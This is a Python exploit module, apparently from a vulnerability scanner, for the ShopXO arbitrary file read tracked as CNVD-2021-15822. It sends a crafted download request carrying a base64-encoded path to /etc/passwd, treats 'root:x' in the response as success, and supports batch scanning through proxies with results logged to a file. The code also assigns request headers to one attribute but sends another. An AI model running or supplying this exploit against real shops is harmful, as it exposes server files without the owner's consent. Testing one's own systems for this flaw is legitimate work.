#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
urllib3.disable_warnings()

class Cnvd_2021_15822:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q='
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("ShopXO", f"存在ShopXO download 任意文件读取漏洞{url2}")
                if self.batch:
                    with open("./result/shopxo_2021_15822.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("ShopXO", "不存在ShopXO download 任意文件读取漏洞")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ShopXO", "开始检测ShopXO download 任意文件读取漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("ShopXO", "ShopXO download 任意文件读取漏洞检测结束")
